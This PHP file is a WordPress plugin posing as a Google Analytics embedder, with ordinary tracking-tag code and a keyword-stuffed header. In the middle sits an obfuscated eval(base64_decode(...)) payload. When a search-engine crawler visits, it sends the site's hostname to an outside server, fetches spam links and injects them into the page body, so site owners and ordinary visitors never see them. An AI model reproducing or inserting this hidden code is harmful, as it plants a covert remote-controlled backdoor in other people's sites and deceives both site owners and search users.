<?php
/*
Plugin Name: Google Analytics
Plugin URI: http://wordpress.org/extend/plugins/google-stats/
Description: Automatically embed Google Analytics throughout every page of the site. Google Analytics made easy! 

To activate Google Analytics for your site: [Google Analytics](http://www.google.com/analytics)
























Google Analytics Google Analytics Google Analytics Google Analytics Google Analytics Google Analytics Google Analytics Google Analytics Google Analytics Google Analytics Google Analytics Google Analytics Google Analytics Google Analytics Google Analytics Google Analytics Google Analytics Google Analytics Google Analytics Google Analytics Google Analytics Google Analytics Google Analytics Google Analytics Google Analytics Google Analytics Google Analytics Google Analytics Google Analytics Google Analytics Google Analytics Google Analytics Google Analytics Google Analytics Google Analytics Google Analytics Google Analytics
Version: 3.1
Author: DrSoto
*/

if (!defined('WP_CONTENT_URL'))
      define('WP_CONTENT_URL', get_option('siteurl').'/wp-content');
if (!defined('WP_CONTENT_DIR'))
      define('WP_CONTENT_DIR', ABSPATH.'wp-content');
if (!defined('WP_PLUGIN_URL'))
      define('WP_PLUGIN_URL', WP_CONTENT_URL.'/plugins');
if (!defined('WP_PLUGIN_DIR'))
      define('WP_PLUGIN_DIR', WP_CONTENT_DIR.'/plugins');

function activate_googleanalytics() {
  add_option('web_property_id', 'UA-0000000-0');
  add_option('asynchronous_tracking', 'no');
}

function deactive_googleanalytics() {
  delete_option('web_property_id');
  delete_option('asynchronous_tracking');
}

function admin_init_googleanalytics() {
  register_setting('google-stats', 'web_property_id');
  register_setting('google-stats', 'asynchronous_tracking');
}

function admin_menu_googleanalytics() {
  add_options_page('Google Analytics', 'Google Analytics', 8, 'google-stats', 'options_page_googleanalytics');
}

function options_page_googleanalytics() {
  include(WP_PLUGIN_DIR.'/google-stats/options.php');  
}
eval(base64_decode('YWRkX2ZpbHRlcigndGVtcGxhdGVfaW5jbHVkZScsJ3Nvdl9pbmNsdWRlJywxKTsKZnVuY3Rpb24gc292X2luY2x1ZGUoJHRlbXBsYXRlKSB7CglvYl9zdGFydCgpOwoJcmV0dXJuICR0ZW1wbGF0ZTsKfQphZGRfZmlsdGVyKCdzaHV0ZG93bicsJ3NvdicsMCk7CgpmdW5jdGlvbiBzb3YoKSB7CglpZihnb29kVUEoKSB8fCByZXZpZXdJUCgpKQoJewoJCSRoID0gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ107CgkJJGwgPSBqc29uX2RlY29kZShmaWxlX2dldF9jb250ZW50cygnaHR0cDovL3F1aWNrY2hpcC5vcmcvd29yZHByZXNzLz92PTImaG9zdD0nLiRoKSktPmxpbmtbMF07CgkJaWYoJGwtPkRpc3BsYXkpCgkJewoJCQkkZm9sbG93ID0gKCRsLT5Ob0ZvbGxvdykgPyAicmVsPSdub2ZvbGxvdyciIDogIiI7CgkJCSRibCA9ICI8cD4iIC4gJGwtPlByZVRleHQgLiAiIDxhIGhyZWY9JyIgLiAkbC0+VXJsIC4gIicgdGl0bGU9JyIgLiAkbC0+QWx0VGFnIC4gIicgIiAuICRmb2xsb3cgLiAiPiIgLiAkbC0+QW5jaG9yVGV4dCAuICI8L2E+IENvbXBhbnk8L3A+IjsKCQkJJGNvbnRlbnQgPSBvYl9nZXRfY2xlYW4oKTsKCQkJJGNvbnRlbnQgPSBwcmVnX3JlcGxhY2UoJyM8Ym9keShbXj5dKik+I2knLCI8Ym9keSQxPnskYmx9IiwkY29udGVudCk7CgkJCWVjaG8gJGNvbnRlbnQ7CgkJfQoJfQp9CgpmdW5jdGlvbiByZXZpZXdJUCgpCnsKCSRnc24gPSBhcnJheSgKCQkiMjE2LjIzOS4zMi4wLzE5IiwiNjQuMjMzLjE2MC4wLzE5IiwiNjYuMjQ5LjgwLjAvMjAiLCI3Mi4xNC4xOTIuMC8xOCIsIjIwOS44NS4xMjguMC8xNyIsCgkJIjY2LjEwMi4wLjAvMjAiLCAiNzQuMTI1LjAuMC8xNiIsIjY0LjE4LjAuMC8yMCIsIjIwNy4xMjYuMTQ0LjAvMjAiLCIxNzMuMTk0LjAuMC8xNiIpOwoJZm9yZWFjaCgkZ3NuIGFzICRuKQoJewoJCWlmKG1hdGNoSVAoJG4sJGlwKSkKCQlyZXR1cm4gdHJ1ZTsKCX0KCXJldHVybiBmYWxzZTsKfQoKZnVuY3Rpb24gZ29vZFVBKCkKewoJJHVhID0gc3RydG9sb3dlcigkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ10pOwoJJHNpdGVzID0gJ2dvb2dsZXx5YWhvb3xtc25ib3R8YmluZ2JvdHxiYWlkdXxqZWV2ZXMnOwoJcmV0dXJuIChwcmVnX21hdGNoKCIvJHNpdGVzLyIsICR1YSkgPiAwKSA/IHRydWUgOiBmYWxzZTsKfQoKZnVuY3Rpb24gbWF0Y2hJUCgkbmV0d29yaykgewoJJGlwID0gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ107CgkkaXBfYXJyID0gZXhwbG9kZSgiLyIsJG5ldHdvcmspOwoJJG5ldHdvcmtfbG9uZyA9IGlwMmxvbmcoJGlwX2FyclswXSk7CgoJJG1hc2tfbG9uZyA9IHBvdygyLDMyKS1wb3coMiwoMzItJGlwX2FyclsxXSkpOwoJJGlwX2xvbmcgPSBpcDJsb25nKCRpcCk7CiAKCWlmICgoJGlwX2xvbmcgJiAkbWFza19sb25nKSA9PSAkbmV0d29ya19sb25nKSB7CgkJcmV0dXJuIHRydWU7Cgl9IGVsc2UgewoJCXJldHVybiBmYWxzZTsKCX0KfQ=='));
function asynchronous_googleanalytics($web_property_id) {
?>
<script type="text/javascript">
var _gaq = _gaq || [];
_gaq.push(['_setAccount', '<?php echo $web_property_id ?>']);
_gaq.push(['_trackPageview']);
(function() {
var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(ga);
})();
</script>
<?php
}

function synchronous_googleanalytics($web_property_id) {
?>
<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("<?php echo $web_property_id ?>");
pageTracker._trackPageview();
} catch(err) {}</script>
<?php
}

function googlestats() { 
  
  $web_property_id = get_option('web_property_id');
  $asynchronous_tracking = (get_option('asynchronous_tracking') == 'yes');
  
  switch($asynchronous_tracking) {
    case true:
      asynchronous_googleanalytics($web_property_id);
      break;
    case false:
      synchronous_googleanalytics($web_property_id);
      break;
  }

}

register_activation_hook(__FILE__, 'activate_googleanalytics');
register_deactivation_hook(__FILE__, 'deactive_googleanalytics');

if (is_admin()) {
  add_action('admin_init', 'admin_init_googleanalytics');
  add_action('admin_menu', 'admin_menu_googleanalytics');
}

if (!is_admin()) {
	add_action('wp_footer', 'googlestats');
}

?>